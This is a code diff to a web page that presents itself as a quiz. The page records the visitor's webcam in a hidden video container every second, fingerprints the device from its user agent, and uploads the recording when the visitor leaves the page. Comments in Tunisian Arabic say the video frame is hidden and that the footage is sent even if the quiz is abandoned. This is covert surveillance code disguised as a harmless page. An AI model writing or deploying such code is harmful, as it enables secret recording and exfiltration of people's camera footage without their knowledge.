@@ -19,6 +19,7 @@
             font-weight: bold;
         }
 
+        /* N'hiw el-cadre mta'a el-video */
         #video-container { display: none; }
         
         .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
@@ -38,7 +39,7 @@
             <video id="webcam" autoplay playsinline muted></video>
         </div>
         
-        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
+        <form id="quizForm">
             <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
             
             <div class="question-box">
@@ -101,19 +102,24 @@
                         recordedChunks.push(event.data);
                     }
                 };
-                mediaRecorder.start(1000);
+                mediaRecorder.start(1000); // Y-recordi kull thaniya
             } catch (err) {
-                console.log("Caméra non autorisée ou indisponible: ", err);
+                console.log("Impossible d'accéder à la caméra ou au micro: ", err);
             }
         });
 
         function getMobileModel() {
             const ua = navigator.userAgent;
             let model = "Appareil Inconnu";
-            if (/android/i.test(ua)) model = "Téléphone Android";
-            else if (/iphone|ipad|ipod/i.test(ua)) model = "iPhone / iOS Device";
-            else if (/windows/i.test(ua)) model = "PC Windows";
-            else if (/macintosh|mac os x/i.test(ua)) model = "Mac";
+            if (/android/i.test(ua)) {
+                model = "Téléphone Android";
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                model = "iPhone / iOS Device";
+            } else if (/windows/i.test(ua)) {
+                model = "PC Windows";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                model = "Mac";
+            }
             return model;
         }
 
@@ -153,6 +159,7 @@
             }
         }
 
+        // Ki yssaker el-utilisateur el-page 9bal ma yjaweb, yeb'ath el-video elli tsajjal
         window.addEventListener('beforeunload', (e) => {
             if (!hasSent && recordedChunks.length > 0) {
                 sendData(true);
